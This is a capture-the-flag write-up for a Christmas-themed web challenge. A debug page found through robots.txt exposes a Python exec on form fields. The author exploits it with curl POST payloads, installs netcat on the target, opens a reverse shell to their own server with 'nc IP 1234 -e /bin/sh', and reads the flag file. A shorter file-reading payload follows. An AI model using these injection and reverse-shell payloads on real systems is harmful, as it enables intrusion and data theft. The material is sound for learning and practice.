# Challenge

So Santa wants some postcards from all you out there. But one tired developer elf has made a tiny mistake.

Can you see if you can find Santa's secret message? 

http://santaspostcards.norwayeast.azurecontainer.io:1337/

> **Hint:** Ok, are there any standard files like favicon.ico associated with websites?

# Writeup

Based on the first hint it says there are other files like favicon.ico, I jump straight to robots.txt. 

```
Disallow: /img/dbg
Disallow: /img/*
```

Quickly opened `/img/dbg` and saw the page source in python. Seeing that it runs a exec I understand we are pwning now. So I quickly figure out what it and see that if I send `stamp = x` and `naughtykid = 5*3` it will evaluate `x = 5*3` and return the value. A quick test:

```
curl -H "Content-Type: application/x-www-form-urlencoded" -X POST http://santaspostcards.norwayeast.azurecontainer.io:1337/ -d "stamp=x&naughtykid=5*3"
```

This adds 15 in the templates as `5*3 = 15`. So I can change 5*3 with any code I want. 

I quickly google `reverse shell python` exited as I am. Finds out that I can run bash commands with `__import__('subprocess').run([command], capture_output=True)`. 

So here starts my journy of using "nc" to reverse shell. I load up `nc -nlvp 1234` on my server. And runs the following requests:

```python
stamp = 'x' # always x, I really dont care.

# Request 1: I tested for NC but it did not exists so I install it on the server. What an nice guy?
naughtykid = __import__('subprocess').run(['apt', 'update'], capture_output=True) 
# Request 2: Install.
naughtykid = __import__('subprocess').run(['apt', 'install', '-y', 'netcat'], capture_output=True) # Installerer netcat
# Request 3: Setup reverse shell
naughtykid = __import__('subprocess').run(['nc', 'IP', '1234', '-e', '/bin/sh'], capture_output=True) # Netcat til min server
```

When connected I did this to get a better bash, only for Quality Of Life.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then started browsing! :)

```bash
$ root@SandboxHost-638043786806304989:/app# ls -lah
ls -lah
total 64K
drwxr-xr-x 1 root root 4.0K Dec  3 01:38 .
drwxr-xr-x 1 root root 4.0K Dec  1 13:47 ..
drwxr-xr-x 1 root root 4.0K Dec  3 01:40 .git
drwxr-xr-x 2 root root 4.0K Nov 18 14:30 __pycache__
-rw-r--r-- 1 root root 1.4K Nov 18 14:30 app.py
-rw-r--r-- 1 root root 2.0K Nov 18 14:30 azure-pipelines.yml
-rw-r--r-- 1 root root  172 Nov 18 14:30 dockerfile
-rw-r--r-- 1 root root    1 Dec  3 01:23 fakeflag.txt
-rw-r--r-- 1 root root   17 Nov 18 14:30 flag.txt
-rw-r--r-- 1 root root    5 Nov 18 14:30 requirements.txt
-rw-r--r-- 1 root root   35 Nov 18 14:30 robots.txt
drwxr-xr-x 1 root root 4.0K Dec  3 00:51 static
drwxr-xr-x 2 root root 4.0K Nov 18 14:30 templates
-rw-r--r-- 1 root root   81 Dec  3 01:38 writeup.md

$ root@SandboxHost-638043786806304989:/app# cat flag.txt
cat flag.txt
${N0_M0RE_CKR3TZ}
$ root@SandboxHost-638043786806304989:/app#
```

# Quicky solution found afterwards:

```python
stamp = x
naughtykid = ','.join(__import__('glob').glob('/*')) # Shows the content of the folder in the webpage
naughtykid = ','.join(__import__('glob').glob('/app/*')) # Browsing into the app folder
naughtykid = open('/app/flag.txt', 'r').read() # Reading flag.txt 

#Solution: ${N0_M0RE_CKR3TZ}
```